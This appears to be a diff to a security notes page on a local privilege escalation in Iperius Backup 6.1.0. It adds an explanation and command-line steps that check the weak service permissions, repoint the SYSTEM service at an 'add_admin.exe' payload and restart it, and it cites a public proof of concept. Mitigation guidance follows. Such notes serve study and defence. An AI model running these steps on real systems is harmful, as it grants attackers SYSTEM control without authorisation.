@@ -26,6 +26,27 @@ The vulnerability is caused by improper permission handling within the Iperius B
 Public exploits are available and documented on public vulnerability databases.
 
 
+## How the exploit works
+
+Iperius Backup installs a service that runs as **SYSTEM**, and version 6.1.0 leaves the service configuration or its binary/working directory writable by standard users — the [Insecure Service Permissions(binPath)](Services-Exploitation/Insecure-Service-Permissions(binPath).md) / [Insecure File Permissions Service Executable Files Path](Services-Exploitation/Insecure-File-Permissions-Service-Executable-Files-Path.md) class. A local user redirects what the SYSTEM service executes to their own payload and restarts it (or waits for the scheduled backup) to run as SYSTEM.
+
+## Exploitation
+
+```cmd
+:: 1. confirm the service and its weak configuration
+sc qc "Iperius Backup Service"
+accesschk.exe -uwcqv "Users" "Iperius Backup Service" /accepteula   :: SERVICE_CHANGE_CONFIG?
+icacls "C:\Program Files (x86)\Iperius Backup\"                     :: writable binary?
+
+:: 2a. if binPath is reconfigurable: point it at a payload and restart
+sc config "Iperius Backup Service" binpath= "C:\Windows\Temp\add_admin.exe"
+sc stop "Iperius Backup Service" & sc start "Iperius Backup Service"
+
+:: 2b. if the binary is writable: overwrite it with your payload, then restart
+```
+
+The public PoC (EDB-46863) supplies a crafted executable; confirm with `whoami` → `nt authority\system`.
+
 ## Mitigation Steps
 
 ### 1. Update Software
